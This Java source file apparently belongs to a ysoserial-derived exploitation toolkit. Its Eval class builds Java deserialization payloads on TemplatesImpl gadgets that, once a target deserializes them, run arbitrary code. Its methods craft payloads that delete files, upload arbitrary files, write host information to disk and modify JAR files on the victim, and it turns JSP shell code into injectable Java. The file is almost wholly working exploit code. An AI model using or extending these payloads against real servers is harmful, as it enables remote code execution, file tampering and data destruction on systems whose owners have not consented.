package ysoserial.payloads;

import javassist.ClassPool;
import javassist.CtClass;
import ysoserial.Deserializer;
import ysoserial.Serializer;
import ysoserial.payloads.util.ClassFiles;
import ysoserial.payloads.util.Encoder;
import ysoserial.payloads.util.JavaCompiler;
import ysoserial.payloads.util.ReadWrite;

import java.util.Base64;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Eval {
    public static void main(String[] args) throws Exception{
//        String code = "Runtime.getRuntime().exec(\"calc.exe\");";
//        Object o = new Eval().getObject(RomeTools.class,code);
//        Object o = new Eval().basicInfo2File(RomeTools.class,"/tmp/1.txt");
        Object o = new Eval().updateJar(RomeTools.class,"/tmp/test.jar","1.txt",ReadWrite.readFile("/tmp/1.txt"));

        byte[] ser = Serializer.serialize(o);

        Deserializer.deserialize(ser);
    }

    public Object deleteFile(Class gadget,String path) throws Exception{
        String code = new String(ReadWrite.readResource(Eval.class,"eval/delete_file.jsp"));
        code = code.replace("%path%",path);
        code = getJavaCodeFromJSP(code);
        return getObject(gadget,code);
    }

    public Object basicInfo2File(Class gadget , String destination) throws Exception{
        String jsp = new String(ReadWrite.readResource(Eval.class,"eval/basicinfo2file.jsp"));
        String java = getJavaCodeFromJSP(jsp);
        java = java.replace("%destination%",destination);
        return getObject(gadget,java);
    }

    public Object updateJar(Class gadget , String jarPath , String entryPath , byte[] content) throws Exception{
        String java = new String(ReadWrite.readResource(Eval.class,"eval/UpdateJar.java"));
        String b64 = Encoder.base64_encode(content);
        java = java.replace("%b64%",b64).replace("%entryPath%",entryPath).replace("%jarPath%",jarPath);
        byte[] b = JavaCompiler.compile("UpdateJar",java);
        Class c = ClassFiles.bytesAsClass(b);
        Object o = new Eval().getObject(gadget,c);
        return o;
    }

    public Object updateJar(Class gadget , String jarPath , String entryPath , byte[] content , String className) throws Exception{
        String java = new String(ReadWrite.readResource(Eval.class,"eval/UpdateJar.java"));
        String b64 = Encoder.base64_encode(content);
        java = java.replace("%b64%",b64).replace("%entryPath%",entryPath).replace("%jarPath%",jarPath);

        String loadClass = "Thread.currentThread().getContextClassLoader().loadClass(\"%className%\");";
        loadClass = loadClass.replace("%className%",className);
        java = java.replace("int flag = 1;",loadClass);

        byte[] b = JavaCompiler.compile("UpdateJar",java);
        Class c = ClassFiles.bytesAsClass(b);
        Object o = new Eval().getObject(gadget,c);
        return o;
    }

    public Object uploadFile(Class gadget,String souce, String destination) throws Exception{
        byte[] content = ReadWrite.readFile(souce);
        return uploadFile(gadget,content,destination);
    }
    public Object uploadFile(Class gadget,byte[] content, String destination) throws Exception{
        String b64 = Encoder.base64_encode(content);
        String code = new String(ReadWrite.readResource(Eval.class, "eval/update_file.jsp"));

        int i = 0;
        long l = b64.length();

        StringBuilder sb = new StringBuilder();

        sb.append("String b[] = new String[]{\n");

        while (i + 0xc000 < l){
            sb.append("\"" + b64.substring(i,i + 0xc000) + "\",");
            i += 0xc000;
        }
        sb.append("\"" + b64.substring(i,b64.length()) + "\",\n};\n");

        sb.append("String b64 = String.join(\"\",b);\n");
        b64 = sb.toString();

        code = code.replace("String b64 = \"%b64%\";",b64).replace("%destination%",destination);
        code = getJavaCodeFromJSP(code);
        return getObject(gadget,code);
    }
    public Object getObject(Class gadget,String code) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(gadget.getName());
        byte[] bytes = clazz.toBytecode();
        String s = new String(bytes);
        if(!s.contains("createTemplatesImpl")){
            throw new Exception("[!] The Gadget must use TemplatesImpl");
        }
        ObjectPayload o = (ObjectPayload)gadget.newInstance();
        return o.getObject("CODE;" + code);
    }
    public Object getObject(Class gadget,Class evilClass) throws Exception {

        final Class superClass = evilClass.getSuperclass();

        if (!superClass.getName().equals("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet")) {
            throw new Exception("[!] evilClass must extend from com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.");
        }

        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(gadget.getName());
        byte[] bytes = clazz.toBytecode();
        String s = new String(bytes);
        if(!s.contains("createTemplatesImpl")){
            throw new Exception("[!] The Gadget must use TemplatesImpl");
        }
        ObjectPayload o = (ObjectPayload)gadget.newInstance();

        pool = ClassPool.getDefault();
        clazz = pool.get(evilClass.getName());
        bytes = clazz.toBytecode();

        s = new String(bytes);
        if(s.contains(evilClass.getName().replace(".","/") + "$")){
            throw new Exception("[!] Do not use inner class or anonymous class in evilClass.");
        }
        String b = new String(Base64.getEncoder().encode(bytes));

        return o.getObject("CLASS;" + b);
    }
    public static String getJavaCodeFromJSP(String jspcode) throws Exception{
        String code = jspcode;
        while (true){
            code = code.trim();
            int end = code.indexOf("%>");
            int i;
            if (code.startsWith("<%--")){
                code = code.substring(end+2);
                continue;
            }else if(code.startsWith("<%@")){
                Pattern pattern = Pattern.compile("<%\\@\\s+page import=\"(.*)\" %>");
                Matcher matcher = pattern.matcher(code);
                code = code.substring(end+2);
                if(matcher.find()) {
                    String s = matcher.group(1);
                    code = code.replaceAll("([^\\.\\w]+)"+s.substring(s.lastIndexOf(".") + 1) + "([^\\w]+)","$1"+s+"$2");
                }
                continue;
            }
            else if(code.startsWith("<jsp:directive.")
                || code.startsWith("<%!")
                || code.startsWith("<jsp:declaration")
                || code.startsWith("<%=")
                || code.startsWith("<jsp:expression")
            ) {
                code = code.substring(end+2);
                continue;
            }else if (code.startsWith("<%")) {
                code = code.substring(2,end);
                break;
            }else {
                return null;
            }
        }
        //javax.servlet
        code = code.replaceAll("([^\\.\\w]+)"+"(AsyncContext|AsyncEvent|AsyncListener|DispatcherType|Filter|FilterChain|FilterConfig|FilterRegistration|GenericFilter|GenericServlet|HttpConstraintElement|HttpMethodConstraintElement|MultipartConfigElement|ReadListener|Registration|RequestDispatcher|Servlet|ServletConfig|ServletContainerInitializer|ServletContext|ServletContextAttributeEvent|ServletContextAttributeListener|ServletContextEvent|ServletContextListener|ServletException|ServletInputStream|ServletOutputStream|ServletRegistration|ServletRequest|ServletRequestAttributeEvent|ServletRequestAttributeListener|ServletRequestEvent|ServletRequestListener|ServletRequestWrapper|ServletResponse|ServletResponseWrapper|ServletSecurityElement|SessionCookieConfig|SessionTrackingMode|SingleThreadModel|UnavailableException|WriteListener)"+ "([^\\w]+)","$1"+"javax.servlet."+"$2"+"$3");
        //javax.servlet.http
        code = code.replaceAll("([^\\.\\w]+)"+"(Cookie|CookieNameValidator|HttpFilter|HttpServlet|HttpServletMapping|HttpServletRequest|HttpServletRequestWrapper|HttpServletResponse|HttpServletResponseWrapper|HttpSession|HttpSessionActivationListener|HttpSessionAttributeListener|HttpSessionBindingEvent|HttpSessionBindingListener|HttpSessionContext|HttpSessionEvent|HttpSessionIdListener|HttpSessionListener|HttpUpgradeHandler|HttpUtils|MappingMatch|Part|PushBuilder|RFC2109Validator|RFC6265Validator|WebConnection)"+ "([^\\w]+)","$1"+"javax.servlet.http."+"$2"+"$3");

        return code;
    }

}
